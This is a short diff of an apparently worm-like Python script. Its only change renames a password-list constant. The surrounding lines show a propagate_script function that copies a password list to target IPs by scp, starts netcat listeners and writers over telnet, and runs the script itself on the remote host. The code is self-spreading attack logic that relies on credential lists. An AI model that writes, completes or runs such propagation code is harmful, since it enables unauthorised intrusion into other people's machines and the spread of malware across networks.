@@ -450,7 +450,7 @@ def propagate_script(ip, port, login_string):
                 os.system(strings.scp_command_string(port,
                                                      login_string_split[0],
                                                      ip,
-                                                     strings.PASSWORDS_LIST))
+                                                     strings.PWDS_LIST))
                 client = SSHClient()
                 try:
                     client.set_missing_host_key_policy(RejectPolicy)
@@ -481,10 +481,10 @@ def propagate_script(ip, port, login_string):
                                              os.path.basename(__file__)))
                       .encode(strings.ENCODE_ASCII))
             tel.write((strings.netcat_listener(port,
-                                               strings.PASSWORDS_LIST))
+                                               strings.PWDS_LIST))
                       .encode(strings.ENCODE_ASCII))
             os.system((strings.netcat_writer(ip, port,
-                                             strings.PASSWORDS_LIST))
+                                             strings.PWDS_LIST))
                       .encode(strings.ENCODE_ASCII))
             tel.write((strings.run_script_command(os.path.basename(__file__),
                                                   login_string_split[0]))
